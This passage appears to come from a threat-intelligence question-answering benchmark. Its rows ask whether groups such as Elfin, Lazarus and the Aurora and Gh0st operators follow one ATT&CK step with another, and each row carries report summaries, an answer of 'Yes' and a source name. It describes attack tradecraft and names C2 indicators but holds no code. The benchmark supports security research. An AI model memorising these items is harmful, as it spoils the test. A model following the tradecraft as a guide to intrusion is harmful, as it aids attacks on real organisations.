Defense Evasion: KiraV2 uses anti-analysis techniques such as encoding strings and changing process names to evade detection. It also employs a signal handler registration method to hide the real C&C server address from analysis.
Credential Access: KiraV2 conducts telnet dictionary attacks using a list of common credentials to gain unauthorized access to IoT devices. It targets environments where telnet is installed and busybox is present, indicating a focus on devices with weak telnet account information.
Impact: KiraV2's primary impact is through DDoS attacks. It supports various types of DDoS attacks, such as UDP flooding and TCP ACK flooding, to disrupt the availability of targeted services and infrastructure.
Others: The report emphasizes the importance of changing default device credentials and updating IoT devices to the latest versions to prevent vulnerability exploitation. AhnLab's anti-malware product, AhnLab V3, detects Mirai malware under the alias Worm/Linux.Mirai.SE189.",Yes,ASEC_REPORT_vol.100_ENG
2685,66,66-Initial Access-T1566-Phishing,"After scanning for vulnerable websites to identify targets or create C&C infrastructure, is it likely that Elfin would exploit CVE-2018-20250 by delivering the exploit via spear-phishing emails before deploying malware tools like Notestuk and Stonedrill for execution?","Initial Access: Elfin attempted to exploit a known vulnerability (CVE-2018-20250) in WinRAR during February 2019 against a target in the chemical sector in Saudi Arabia. The exploit, delivered likely via spear-phishing, could permit code execution on unpatched computers. Symantec's proactive protection (Exp.CVE-2018-20250) prevented the targeted organization from being compromised.","Reconnaissance: The Elfin espionage group, also known as APT33, has been actively scanning for vulnerable websites to identify potential targets for attacks or to create command and control (C&C) infrastructure. This activity has been ongoing since the group first became active in late 2015 or early 2016.
Execution: Elfin has deployed a wide range of tools in its attacks, including custom malware such as Notestuk (Backdoor.Notestuk), Stonedrill (Trojan.Stonedrill), and an AutoIt backdoor, as well as commodity malware like Remcos (Backdoor.Remvio), DarkComet (Backdoor.Breut), Quasar RAT (Trojan.Quasar), Pupy RAT (Backdoor.Patpoopy), NanoCore (Trojan.Nancrat), and NetWeird (Trojan.Netweird.B).
Persistence: In a detailed case study of an attack on a U.S. organization, Elfin created a scheduled task to execute a malicious VBE file multiple times a day, ensuring persistence on the compromised system.
Defense Evasion: Elfin used PowerShell commands to bypass logging on the infected machine, as part of their defense evasion tactics. They also deployed various versions of DarkComet, POSHC2 implants, and an AutoIt backdoor, along with further credential dumping activities.
Credential Access: Elfin deployed DarkComet, which included a credential dumping tool, to extract credentials from the compromised system.
Command and Control: Elfin used POSHC2, a proxy-aware C&C framework, to communicate with the compromised systems. They also used Quasar RAT and other tools to maintain control over the infected computers.
Exfiltration: Elfin exfiltrated data using a custom .NET FTP tool and a custom AutoIt FTP exfiltration tool known as FastUploader, designed to exfiltrate data at a faster rate than traditional FTP clients.
Others: Symantec has provided file-based protection against Elfin's tools and techniques, as well as threat intelligence through the DeepSight Intelligence Managed Adversary and Threat Intelligence (MATI) service. The Attack Investigation Team within Symantec Security Response is dedicated to investigating targeted attacks and enhancing protection in Symantec products.",Yes,Elfin Relentless Espionage Group Targets Multiple Organizations in Saudi Arabia and US
2692,66,66-Command and Control-T1102-Web Service,"After deploying DarkComet for credential dumping during credential access, is Elfin likely to use web services such as POSHC2 and Quasar RAT for communication with compromised systems in the command and control phase before performing data exfiltration using FastUploader?","Command and Control: Elfin used POSHC2, a proxy-aware C&C framework, to communicate with the compromised systems. They also used Quasar RAT and other tools to maintain control over the infected computers.","Reconnaissance: The Elfin espionage group, also known as APT33, has been actively scanning for vulnerable websites to identify potential targets for attacks or to create command and control (C&C) infrastructure. This activity has been ongoing since the group first became active in late 2015 or early 2016.
Initial Access: Elfin attempted to exploit a known vulnerability (CVE-2018-20250) in WinRAR during February 2019 against a target in the chemical sector in Saudi Arabia. The exploit, delivered likely via spear-phishing, could permit code execution on unpatched computers. Symantec's proactive protection (Exp.CVE-2018-20250) prevented the targeted organization from being compromised.
Execution: Elfin has deployed a wide range of tools in its attacks, including custom malware such as Notestuk (Backdoor.Notestuk), Stonedrill (Trojan.Stonedrill), and an AutoIt backdoor, as well as commodity malware like Remcos (Backdoor.Remvio), DarkComet (Backdoor.Breut), Quasar RAT (Trojan.Quasar), Pupy RAT (Backdoor.Patpoopy), NanoCore (Trojan.Nancrat), and NetWeird (Trojan.Netweird.B).
Persistence: In a detailed case study of an attack on a U.S. organization, Elfin created a scheduled task to execute a malicious VBE file multiple times a day, ensuring persistence on the compromised system.
Defense Evasion: Elfin used PowerShell commands to bypass logging on the infected machine, as part of their defense evasion tactics. They also deployed various versions of DarkComet, POSHC2 implants, and an AutoIt backdoor, along with further credential dumping activities.
Credential Access: Elfin deployed DarkComet, which included a credential dumping tool, to extract credentials from the compromised system.
Exfiltration: Elfin exfiltrated data using a custom .NET FTP tool and a custom AutoIt FTP exfiltration tool known as FastUploader, designed to exfiltrate data at a faster rate than traditional FTP clients.
Others: Symantec has provided file-based protection against Elfin's tools and techniques, as well as threat intelligence through the DeepSight Intelligence Managed Adversary and Threat Intelligence (MATI) service. The Attack Investigation Team within Symantec Security Response is dedicated to investigating targeted attacks and enhancing protection in Symantec products.",Yes,Elfin Relentless Espionage Group Targets Multiple Organizations in Saudi Arabia and US
2694,66,66-Exfiltration-T1048-Exfiltration Over Alternative Protocol,"After Elfin established command and control using POSHC2 and other tools like Quasar RAT, is it likely that they proceeded to exfiltrate data using a custom .NET FTP tool and FastUploader, which is designed for faster data transfer than traditional FTP clients?","Exfiltration: Elfin exfiltrated data using a custom .NET FTP tool and a custom AutoIt FTP exfiltration tool known as FastUploader, designed to exfiltrate data at a faster rate than traditional FTP clients.","Reconnaissance: The Elfin espionage group, also known as APT33, has been actively scanning for vulnerable websites to identify potential targets for attacks or to create command and control (C&C) infrastructure. This activity has been ongoing since the group first became active in late 2015 or early 2016.
Initial Access: Elfin attempted to exploit a known vulnerability (CVE-2018-20250) in WinRAR during February 2019 against a target in the chemical sector in Saudi Arabia. The exploit, delivered likely via spear-phishing, could permit code execution on unpatched computers. Symantec's proactive protection (Exp.CVE-2018-20250) prevented the targeted organization from being compromised.
Execution: Elfin has deployed a wide range of tools in its attacks, including custom malware such as Notestuk (Backdoor.Notestuk), Stonedrill (Trojan.Stonedrill), and an AutoIt backdoor, as well as commodity malware like Remcos (Backdoor.Remvio), DarkComet (Backdoor.Breut), Quasar RAT (Trojan.Quasar), Pupy RAT (Backdoor.Patpoopy), NanoCore (Trojan.Nancrat), and NetWeird (Trojan.Netweird.B).
Persistence: In a detailed case study of an attack on a U.S. organization, Elfin created a scheduled task to execute a malicious VBE file multiple times a day, ensuring persistence on the compromised system.
Defense Evasion: Elfin used PowerShell commands to bypass logging on the infected machine, as part of their defense evasion tactics. They also deployed various versions of DarkComet, POSHC2 implants, and an AutoIt backdoor, along with further credential dumping activities.
Credential Access: Elfin deployed DarkComet, which included a credential dumping tool, to extract credentials from the compromised system.
Command and Control: Elfin used POSHC2, a proxy-aware C&C framework, to communicate with the compromised systems. They also used Quasar RAT and other tools to maintain control over the infected computers.
Others: Symantec has provided file-based protection against Elfin's tools and techniques, as well as threat intelligence through the DeepSight Intelligence Managed Adversary and Threat Intelligence (MATI) service. The Attack Investigation Team within Symantec Security Response is dedicated to investigating targeted attacks and enhancing protection in Symantec products.",Yes,Elfin Relentless Espionage Group Targets Multiple Organizations in Saudi Arabia and US
2696,67,67-Persistence-T1547-Boot or Logon Autostart Execution,"After gaining initial access through compromised email accounts and phishing emails containing executables like 'Pleasantly Surprised.exe,' is it likely that the Piano Gh0st variant will create a new registry entry with the key 'nvidiake' to maintain persistence before evading defenses by wrapping its payload in a self-extracting executable (SFW)?","Persistence: The Piano Gh0st variant maintains persistence on infected systems by creating a registry entry at 'HKCU\Software\Microsoft\Windows\CurrentVersion\Run' with the key 'nvidiake' and value 'c:\microsoft\lib\ke\vv.js.' The 'vv.js' JavaScript file executes the 'vvv.bat' batch file, which in turn runs the Piano.dll payload using 'rundll32.exe' to call the 'mystart' function.","Initial Access: The Gh0st malware, a remote administration tool (RAT) originating from China, has been deployed in a multi-year campaign called Musical Chairs, using a new variant named 'Piano Gh0st.' The attackers distribute the malware through compromised email accounts, adopting a 'shotgun' approach by sending phishing emails with attached executables to numerous recipients. The emails are sent from US-based residential ISP email addresses, which appear to be legitimate and compromised. Known filenames of attachments include 'Pleasantly Surprised.exe,' 'Beautiful Girls.exe,' 'Sexy Girls.exe,' 'gift card.exe,' and 'amazon gift card.pdf.exe.' The emails' subjects typically match the filenames without sophisticated social engineering attempts. Detected attacks by Palo Alto Networks WildFire have been exclusively in the United States, not targeting any specific industry.
Defense Evasion: The Piano Gh0st variant uses a new wrapper file to conceal the Gh0st payload, delivered as a self-extracting executable (SFW) acting as the dropper. It extracts its payload to 'c:\microsoft\lib\ke\Piano.dll' and executes the 'mystart' function within the DLL's export address table (EAT) using 'rundll32.exe.' The 'Piano.dll' file decrypts, loads, and runs an embedded DLL, which is the actual Gh0stRat Trojan, version 3.6.
Command and Control: The Gh0stRat Trojan communicates with its command and control server using a custom network protocol. The magic tag used by this version of Gh0st is 'clarkclar1.' The command and control server domain is www.meitanjiaoyiwang[.]com, hosted by the IP address 98.126.67.114 on TCP port 200. The server uses a US-based IP address but displays a Chinese language interface for Remote Desktop connections. The infrastructure for Musical Chairs has been active for two years, with 32 different Gh0st samples connecting to this server dating back to July 2013, using 19 different TCP ports.
Others: The Gh0st malware has been the subject of many analysis reports, including those describing targeted espionage campaigns like Operation Night Dragon and the GhostNet attacks on Tibet. The source code and building tools for Gh0st are freely available on the web, allowing anyone to build their own version of the malware. Researchers differentiate between variants based on their 'magic tag.' The malware identifies itself to the C2 server by sending a string of characters (the magic tag), which the server repeats back to confirm the connection. The original version's string was 'Gh0st,' but subsequent versions use many different strings. These strings, along with the location of the command and control server, allow association of various Gh0st samples with a single attacker or group. The earliest versions of the attacks are visible in email groups and public Facebook postings, with themes like 'my girlfriend's self-view video' linking to executables hosted on domains associated with the Musical Chairs infrastructure. The campaign's approximate start date is 2010.",Yes,PaloAlto.musical-chairs-multi-year-campaign-involving-new-variant-of-gh0st-malware
2700,68,68-Persistence-T1543-Create or Modify System Process,"After the Aurora malware gains execution by registering a service pointing to a backdoor DLL and obtaining the C&C server DNS name from an encrypted embedded resource, is it likely that the malware will achieve persistence by installing itself as a service before modifying registry keys and decompressing an embedded DLL into the Windows system32 directory?","Persistence: The Aurora malware achieved persistence by installing itself as a service under random names and modifying registry keys. The dropper decompressed an embedded DLL into the Windows system32 directory and loaded it as a service, with registry keys created and then deleted as part of the process.","Initial Access: The Aurora operation utilized a JavaScript-based exploit vector targeting Internet Explorer 6, as detailed in Microsoft Security Bulletin MS10-002. The exploit involved a heap spray attack and shellcode injection, which then downloaded a secondary payload from a server. The dropper, once executed, would delete itself.
Execution: The malware's execution process involved a two-stage installation. Initially, the dropper installed the payload as a service, which then deleted the first service and registered a second service pointing to the same backdoor DLL. The payload accessed an encrypted embedded resource to obtain the C&C server DNS name.
Defense Evasion: To evade detection, the dropper modified the file-time of the dropped DLL to match that of an existing system DLL and loaded the DLL into its own svchost.exe process. The dropper also deleted itself using a dissolving batch file.
Command and Control: The Aurora malware communicated with C&C servers over port 443 using a weak custom encryption scheme. The C&C protocol involved specific packet formats and encrypted payloads with keys recoverable from the packet header.
Others: The report provides insights into the origins, developers, and operators of the Aurora malware operation, attributing it to Chinese origins based on forensic tool-marks and domain registration information. It also details detection methods, including JavaScript and shellcode artifacts, network detection signatures, and actionable intelligence for identifying and remediating the malware. Additionally, it discusses the global activity of the exploit and provides information on remediation and prevention strategies using various enterprise products and services.",Yes,Aurora_HBGARY_DRAFT
2702,68,68-Command and Control-T1573-Encrypted Channel,"After modifying the file-time of the dropped DLL to match that of an existing system DLL and loading the DLL into its own svchost.exe process to evade detection, is it likely that the Aurora malware will communicate with C&C servers over port 443 using a weak custom encryption scheme?",Command and Control: The Aurora malware communicated with C&C servers over port 443 using a weak custom encryption scheme. The C&C protocol involved specific packet formats and encrypted payloads with keys recoverable from the packet header.,"Initial Access: The Aurora operation utilized a JavaScript-based exploit vector targeting Internet Explorer 6, as detailed in Microsoft Security Bulletin MS10-002. The exploit involved a heap spray attack and shellcode injection, which then downloaded a secondary payload from a server. The dropper, once executed, would delete itself.
Execution: The malware's execution process involved a two-stage installation. Initially, the dropper installed the payload as a service, which then deleted the first service and registered a second service pointing to the same backdoor DLL. The payload accessed an encrypted embedded resource to obtain the C&C server DNS name.
Persistence: The Aurora malware achieved persistence by installing itself as a service under random names and modifying registry keys. The dropper decompressed an embedded DLL into the Windows system32 directory and loaded it as a service, with registry keys created and then deleted as part of the process.
Defense Evasion: To evade detection, the dropper modified the file-time of the dropped DLL to match that of an existing system DLL and loaded the DLL into its own svchost.exe process. The dropper also deleted itself using a dissolving batch file.
Others: The report provides insights into the origins, developers, and operators of the Aurora malware operation, attributing it to Chinese origins based on forensic tool-marks and domain registration information. It also details detection methods, including JavaScript and shellcode artifacts, network detection signatures, and actionable intelligence for identifying and remediating the malware. Additionally, it discusses the global activity of the exploit and provides information on remediation and prevention strategies using various enterprise products and services.",Yes,Aurora_HBGARY_DRAFT
2709,69,69-Defense Evasion-T1055-Process Injection,"After the IEXPL0RE RAT gains initial access by delivering password-protected archives with disguised executables via social engineering, is it likely that the malware will execute a launcher program custom-generated to avoid signature-based detection before employing a multi-stage unpacking process for defense evasion?","Defense Evasion: The IEXPL0RE RAT employs various defense evasion techniques. It is delivered in a custom-generated launcher program to evade signature-based antivirus detection. The RAT also uses a multi-stage unpacking process, with the final payload injected into memory rather than written to disk, making it harder to detect.","Initial Access: The IEXPL0RE RAT was delivered to human rights-related organizations via email attachments using social engineering techniques. The emails were tailored to the targets with relevant subjects and content. The attachments included executables disguised as legitimate files, such as images or documents, using techniques like Unicode right-to-left override characters. In one instance, an executable was designed to appear as a video of a speech by the Dalai Lama. The attachments were often in password-protected archives, with the password provided in the email, to evade antivirus detection.
Execution: Upon opening the document or running the program, the IEXPL0RE RAT installs a launcher program on the victim's computer. This launcher program is custom-generated for each target, making it difficult for signature-based antivirus programs to detect. The launcher goes through multiple stages to unpack and run the actual RAT, which is never written to disk but injected into memory.
Persistence: The IEXPL0RE RAT establishes persistence by installing a binary and a startup link in the Start Menu and leaving traces in the %temp% folder. It also uses files for configuration and recording keystrokes, such as lock.dat, MSMAPI32.SRG, and STREAM.SYS.
Collection: The IEXPL0RE RAT is capable of recording keystrokes, including passwords, and sending this data back to the command and control server at regular intervals. It also has the functionality to download files and install more specific malware, such as a Skype plugin that records calls.
Command and Control: The IEXPL0RE RAT communicates with a command and control (C2) server using HTTP POST and GET methods, with all communication encrypted. The C2 server is specified in a configuration file built into the RAT program. The RAT has exhibited different C2 communication behaviors over time, indicating active development and monitoring.
Others: The IEXPL0RE RAT is actively developed, with both client and server components continuously changing. The server has shown different behaviors to block unauthorized access, such as redirecting to Microsoft's website when an invalid URL is referenced. The RAT contains over 40 commands for file system and registry manipulation, data exfiltration, and real-time control of the system. It also has specific functionality for plugins relating to video and audio capture, indicating an interest in collecting data on the targets' appearances.",Yes,IEXPL0RE_RAT
2712,69,69-Command and Control-T1071-Application Layer Protocol,"After the IEXPL0RE RAT records keystrokes and exfiltrates data such as passwords as part of its collection activities, is it likely to communicate with the command and control (C2) server using encrypted HTTP POST and GET methods for exfiltration and further instructions?","Command and Control: The IEXPL0RE RAT communicates with a command and control (C2) server using HTTP POST and GET methods, with all communication encrypted. The C2 server is specified in a configuration file built into the RAT program. The RAT has exhibited different C2 communication behaviors over time, indicating active development and monitoring.","Initial Access: The IEXPL0RE RAT was delivered to human rights-related organizations via email attachments using social engineering techniques. The emails were tailored to the targets with relevant subjects and content. The attachments included executables disguised as legitimate files, such as images or documents, using techniques like Unicode right-to-left override characters. In one instance, an executable was designed to appear as a video of a speech by the Dalai Lama. The attachments were often in password-protected archives, with the password provided in the email, to evade antivirus detection.
Execution: Upon opening the document or running the program, the IEXPL0RE RAT installs a launcher program on the victim's computer. This launcher program is custom-generated for each target, making it difficult for signature-based antivirus programs to detect. The launcher goes through multiple stages to unpack and run the actual RAT, which is never written to disk but injected into memory.
Persistence: The IEXPL0RE RAT establishes persistence by installing a binary and a startup link in the Start Menu and leaving traces in the %temp% folder. It also uses files for configuration and recording keystrokes, such as lock.dat, MSMAPI32.SRG, and STREAM.SYS.
Defense Evasion: The IEXPL0RE RAT employs various defense evasion techniques. It is delivered in a custom-generated launcher program to evade signature-based antivirus detection. The RAT also uses a multi-stage unpacking process, with the final payload injected into memory rather than written to disk, making it harder to detect.
Collection: The IEXPL0RE RAT is capable of recording keystrokes, including passwords, and sending this data back to the command and control server at regular intervals. It also has the functionality to download files and install more specific malware, such as a Skype plugin that records calls.
Others: The IEXPL0RE RAT is actively developed, with both client and server components continuously changing. The server has shown different behaviors to block unauthorized access, such as redirecting to Microsoft's website when an invalid URL is referenced. The RAT contains over 40 commands for file system and registry manipulation, data exfiltration, and real-time control of the system. It also has specific functionality for plugins relating to video and audio capture, indicating an interest in collecting data on the targets' appearances.",Yes,IEXPL0RE_RAT
2722,7,7-Discovery-T1135-Network Share Discovery,"After achieving credential access through the use of the Responder tool to harvest login credentials, is it likely that the Lazarus group will proceed with lateral movement using Windows commands and WMIC before conducting discovery activities such as network share discovery?","Discovery: The group conducted discovery activities such as network share, process, system network configuration, system owner/user, system network connections, system information, file and directory, and system service discovery.","Reconnaissance: The Lazarus group conducted reconnaissance by using spear-phishing emails embellished with personal information gathered from publicly available sources. The emails targeted various departments within the defense industry, claiming to have urgent updates on COVID-19. The attackers registered email accounts that resembled the medical center's real email addresses and included the actual personal data of the deputy head doctor in the signature. The phishing emails contained a malicious Word document designed to download and execute additional malware.
Initial Access: The initial access was achieved through spear-phishing emails containing malicious Word documents. The documents, which were unrelated to COVID-19, contained macros that, when enabled, would download and execute additional malware. The attackers sent follow-up emails instructing recipients on how to enable macros. The infection was successful when an employee opened one of the attachments, allowing the attackers to gain remote control of the infected system.
Execution: The malware, known as ThreatNeedle, was executed in a multistage deployment procedure. It began with a spear-phishing document that loaded the next stage as a backdoor running in-memory. The ThreatNeedle backdoor was used for initial reconnaissance and to deploy additional malware for lateral movement.
Persistence: The ThreatNeedle installer-type malware was responsible for implanting the next stage loader-type malware and registering it for auto-execution to achieve persistence. The loader-type malware existed in several variations and served the primary purpose of loading the final stage of the ThreatNeedle malware in-memory.
Defense Evasion: The Lazarus group utilized various techniques to evade detection, including deleting log files from the router and using a custom web shell script. They also employed masquerading techniques, such as renaming system utilities and modifying registry keys to hide their activities.
Credential Access: The group executed a credential harvesting tool named Responder from one of the victim machines to acquire login credentials, which were then used for lateral movement.
Lateral Movement: Lateral movement was achieved using Windows commands and the Windows Management Instrumentation Command-line (WMIC) to establish network connections and copy malware to remote hosts. The attackers also compromised a router virtual machine to overcome network segmentation and access the restricted network segment.
Collection: The group archived collected data using utilities to prepare for exfiltration.
Command and Control: The command-and-control infrastructure involved multiple servers for various stages, with the attackers configuring the Apache web server on a compromised router to use it as a proxy server between the organization's corporate and restricted segments.
Exfiltration: Data exfiltration was performed using a custom tunneling tool with a custom encryption routine to create a covert channel. The group also used a Trojanized VNC Uploader to upload data to the C2 server via HTTP POST requests.
Others: The Lazarus group's campaign against the defense industry was attributed to their use of the ThreatNeedle malware cluster, which is an advanced version of Manuscrypt (a.k.a. NukeSped). The group demonstrated its ability to circumvent security measures such as network segmentation. Connections were found between this campaign and other Lazarus group campaigns, including DeathNote, Operation AppleJeus, and Bookcode.",Yes,kaspersky-ics-cert-lazarus-targets-defense-industry-with-threatneedle-en-20210225
2723,7,7-Discovery-T1057-Process Discovery,"After achieving persistence through the deployment of the ThreatNeedle installer-type malware and registering loader-type malware for auto-execution, is the Lazarus group likely to conduct discovery activities such as process discovery before using Windows commands and WMIC for lateral movement?","Discovery: The group conducted discovery activities such as network share, process, system network configuration, system owner/user, system network connections, system information, file and directory, and system service discovery.","Reconnaissance: The Lazarus group conducted reconnaissance by using spear-phishing emails embellished with personal information gathered from publicly available sources. The emails targeted various departments within the defense industry, claiming to have urgent updates on COVID-19. The attackers registered email accounts that resembled the medical center's real email addresses and included the actual personal data of the deputy head doctor in the signature. The phishing emails contained a malicious Word document designed to download and execute additional malware.
Initial Access: The initial access was achieved through spear-phishing emails containing malicious Word documents. The documents, which were unrelated to COVID-19, contained macros that, when enabled, would download and execute additional malware. The attackers sent follow-up emails instructing recipients on how to enable macros. The infection was successful when an employee opened one of the attachments, allowing the attackers to gain remote control of the infected system.
Execution: The malware, known as ThreatNeedle, was executed in a multistage deployment procedure. It began with a spear-phishing document that loaded the next stage as a backdoor running in-memory. The ThreatNeedle backdoor was used for initial reconnaissance and to deploy additional malware for lateral movement.
Persistence: The ThreatNeedle installer-type malware was responsible for implanting the next stage loader-type malware and registering it for auto-execution to achieve persistence. The loader-type malware existed in several variations and served the primary purpose of loading the final stage of the ThreatNeedle malware in-memory.
Defense Evasion: The Lazarus group utilized various techniques to evade detection, including deleting log files from the router and using a custom web shell script. They also employed masquerading techniques, such as renaming system utilities and modifying registry keys to hide their activities.
Credential Access: The group executed a credential harvesting tool named Responder from one of the victim machines to acquire login credentials, which were then used for lateral movement.
Lateral Movement: Lateral movement was achieved using Windows commands and the Windows Management Instrumentation Command-line (WMIC) to establish network connections and copy malware to remote hosts. The attackers also compromised a router virtual machine to overcome network segmentation and access the restricted network segment.
Collection: The group archived collected data using utilities to prepare for exfiltration.
Command and Control: The command-and-control infrastructure involved multiple servers for various stages, with the attackers configuring the Apache web server on a compromised router to use it as a proxy server between the organization's corporate and restricted segments.
Exfiltration: Data exfiltration was performed using a custom tunneling tool with a custom encryption routine to create a covert channel. The group also used a Trojanized VNC Uploader to upload data to the C2 server via HTTP POST requests.
Others: The Lazarus group's campaign against the defense industry was attributed to their use of the ThreatNeedle malware cluster, which is an advanced version of Manuscrypt (a.k.a. NukeSped). The group demonstrated its ability to circumvent security measures such as network segmentation. Connections were found between this campaign and other Lazarus group campaigns, including DeathNote, Operation AppleJeus, and Bookcode.",Yes,kaspersky-ics-cert-lazarus-targets-defense-industry-with-threatneedle-en-20210225
2724,7,7-Discovery-T1016-System Network Configuration Discovery,"After using the credential harvesting tool Responder from compromised machines to acquire login credentials, is the Lazarus group likely to conduct discovery activities such as system network configuration and process discovery before using Windows commands and WMIC for lateral movement within the network?","Discovery: The group conducted discovery activities such as network share, process, system network configuration, system owner/user, system network connections, system information, file and directory, and system service discovery.","Reconnaissance: The Lazarus group conducted reconnaissance by using spear-phishing emails embellished with personal information gathered from publicly available sources. The emails targeted various departments within the defense industry, claiming to have urgent updates on COVID-19. The attackers registered email accounts that resembled the medical center's real email addresses and included the actual personal data of the deputy head doctor in the signature. The phishing emails contained a malicious Word document designed to download and execute additional malware.
Initial Access: The initial access was achieved through spear-phishing emails containing malicious Word documents. The documents, which were unrelated to COVID-19, contained macros that, when enabled, would download and execute additional malware. The attackers sent follow-up emails instructing recipients on how to enable macros. The infection was successful when an employee opened one of the attachments, allowing the attackers to gain remote control of the infected system.
Execution: The malware, known as ThreatNeedle, was executed in a multistage deployment procedure. It began with a spear-phishing document that loaded the next stage as a backdoor running in-memory. The ThreatNeedle backdoor was used for initial reconnaissance and to deploy additional malware for lateral movement.
Persistence: The ThreatNeedle installer-type malware was responsible for implanting the next stage loader-type malware and registering it for auto-execution to achieve persistence. The loader-type malware existed in several variations and served the primary purpose of loading the final stage of the ThreatNeedle malware in-memory.
Defense Evasion: The Lazarus group utilized various techniques to evade detection, including deleting log files from the router and using a custom web shell script. They also employed masquerading techniques, such as renaming system utilities and modifying registry keys to hide their activities.
Credential Access: The group executed a credential harvesting tool named Responder from one of the victim machines to acquire login credentials, which were then used for lateral movement.
Lateral Movement: Lateral movement was achieved using Windows commands and the Windows Management Instrumentation Command-line (WMIC) to establish network connections and copy malware to remote hosts. The attackers also compromised a router virtual machine to overcome network segmentation and access the restricted network segment.
Collection: The group archived collected data using utilities to prepare for exfiltration.
Command and Control: The command-and-control infrastructure involved multiple servers for various stages, with the attackers configuring the Apache web server on a compromised router to use it as a proxy server between the organization's corporate and restricted segments.
Exfiltration: Data exfiltration was performed using a custom tunneling tool with a custom encryption routine to create a covert channel. The group also used a Trojanized VNC Uploader to upload data to the C2 server via HTTP POST requests.
Others: The Lazarus group's campaign against the defense industry was attributed to their use of the ThreatNeedle malware cluster, which is an advanced version of Manuscrypt (a.k.a. NukeSped). The group demonstrated its ability to circumvent security measures such as network segmentation. Connections were found between this campaign and other Lazarus group campaigns, including DeathNote, Operation AppleJeus, and Bookcode.",Yes,kaspersky-ics-cert-lazarus-targets-defense-industry-with-threatneedle-en-20210225
2725,7,7-Discovery-T1033-System Owner/User Discovery,"Following the execution of ThreatNeedle backdoor for initial reconnaissance and deploying additional malware, is the Lazarus group likely to achieve persistence by implanting loader-type malware registered for auto-execution before conducting discovery activities like system owner/user discovery?","Discovery: The group conducted discovery activities such as network share, process, system network configuration, system owner/user, system network connections, system information, file and directory, and system service discovery.","Reconnaissance: The Lazarus group conducted reconnaissance by using spear-phishing emails embellished with personal information gathered from publicly available sources. The emails targeted various departments within the defense industry, claiming to have urgent updates on COVID-19. The attackers registered email accounts that resembled the medical center's real email addresses and included the actual personal data of the deputy head doctor in the signature. The phishing emails contained a malicious Word document designed to download and execute additional malware.
Initial Access: The initial access was achieved through spear-phishing emails containing malicious Word documents. The documents, which were unrelated to COVID-19, contained macros that, when enabled, would download and execute additional malware. The attackers sent follow-up emails instructing recipients on how to enable macros. The infection was successful when an employee opened one of the attachments, allowing the attackers to gain remote control of the infected system.
Execution: The malware, known as ThreatNeedle, was executed in a multistage deployment procedure. It began with a spear-phishing document that loaded the next stage as a backdoor running in-memory. The ThreatNeedle backdoor was used for initial reconnaissance and to deploy additional malware for lateral movement.
Persistence: The ThreatNeedle installer-type malware was responsible for implanting the next stage loader-type malware and registering it for auto-execution to achieve persistence. The loader-type malware existed in several variations and served the primary purpose of loading the final stage of the ThreatNeedle malware in-memory.
Defense Evasion: The Lazarus group utilized various techniques to evade detection, including deleting log files from the router and using a custom web shell script. They also employed masquerading techniques, such as renaming system utilities and modifying registry keys to hide their activities.
Credential Access: The group executed a credential harvesting tool named Responder from one of the victim machines to acquire login credentials, which were then used for lateral movement.
Lateral Movement: Lateral movement was achieved using Windows commands and the Windows Management Instrumentation Command-line (WMIC) to establish network connections and copy malware to remote hosts. The attackers also compromised a router virtual machine to overcome network segmentation and access the restricted network segment.
Collection: The group archived collected data using utilities to prepare for exfiltration.
Command and Control: The command-and-control infrastructure involved multiple servers for various stages, with the attackers configuring the Apache web server on a compromised router to use it as a proxy server between the organization's corporate and restricted segments.
Exfiltration: Data exfiltration was performed using a custom tunneling tool with a custom encryption routine to create a covert channel. The group also used a Trojanized VNC Uploader to upload data to the C2 server via HTTP POST requests.
Others: The Lazarus group's campaign against the defense industry was attributed to their use of the ThreatNeedle malware cluster, which is an advanced version of Manuscrypt (a.k.a. NukeSped). The group demonstrated its ability to circumvent security measures such as network segmentation. Connections were found between this campaign and other Lazarus group campaigns, including DeathNote, Operation AppleJeus, and Bookcode.",Yes,kaspersky-ics-cert-lazarus-targets-defense-industry-with-threatneedle-en-20210225
2726,7,7-Discovery-T1049-System Network Connections Discovery,"Before conducting discovery activities such as system network connections discovery under the Discovery tactic, is it likely that Lazarus gained initial access to the victim's network through spear-phishing emails containing a malicious Word document and achieved execution by running the ThreatNeedle backdoor in memory?","Discovery: The group conducted discovery activities such as network share, process, system network configuration, system owner/user, system network connections, system information, file and directory, and system service discovery.","Reconnaissance: The Lazarus group conducted reconnaissance by using spear-phishing emails embellished with personal information gathered from publicly available sources. The emails targeted various departments within the defense industry, claiming to have urgent updates on COVID-19. The attackers registered email accounts that resembled the medical center's real email addresses and included the actual personal data of the deputy head doctor in the signature. The phishing emails contained a malicious Word document designed to download and execute additional malware.
Initial Access: The initial access was achieved through spear-phishing emails containing malicious Word documents. The documents, which were unrelated to COVID-19, contained macros that, when enabled, would download and execute additional malware. The attackers sent follow-up emails instructing recipients on how to enable macros. The infection was successful when an employee opened one of the attachments, allowing the attackers to gain remote control of the infected system.
Execution: The malware, known as ThreatNeedle, was executed in a multistage deployment procedure. It began with a spear-phishing document that loaded the next stage as a backdoor running in-memory. The ThreatNeedle backdoor was used for initial reconnaissance and to deploy additional malware for lateral movement.
Persistence: The ThreatNeedle installer-type malware was responsible for implanting the next stage loader-type malware and registering it for auto-execution to achieve persistence. The loader-type malware existed in several variations and served the primary purpose of loading the final stage of the ThreatNeedle malware in-memory.
Defense Evasion: The Lazarus group utilized various techniques to evade detection, including deleting log files from the router and using a custom web shell script. They also employed masquerading techniques, such as renaming system utilities and modifying registry keys to hide their activities.
Credential Access: The group executed a credential harvesting tool named Responder from one of the victim machines to acquire login credentials, which were then used for lateral movement.
Lateral Movement: Lateral movement was achieved using Windows commands and the Windows Management Instrumentation Command-line (WMIC) to establish network connections and copy malware to remote hosts. The attackers also compromised a router virtual machine to overcome network segmentation and access the restricted network segment.
Collection: The group archived collected data using utilities to prepare for exfiltration.
Command and Control: The command-and-control infrastructure involved multiple servers for various stages, with the attackers configuring the Apache web server on a compromised router to use it as a proxy server between the organization's corporate and restricted segments.
Exfiltration: Data exfiltration was performed using a custom tunneling tool with a custom encryption routine to create a covert channel. The group also used a Trojanized VNC Uploader to upload data to the C2 server via HTTP POST requests.
Others: The Lazarus group's campaign against the defense industry was attributed to their use of the ThreatNeedle malware cluster, which is an advanced version of Manuscrypt (a.k.a. NukeSped). The group demonstrated its ability to circumvent security measures such as network segmentation. Connections were found between this campaign and other Lazarus group campaigns, including DeathNote, Operation AppleJeus, and Bookcode.",Yes,kaspersky-ics-cert-lazarus-targets-defense-industry-with-threatneedle-en-20210225
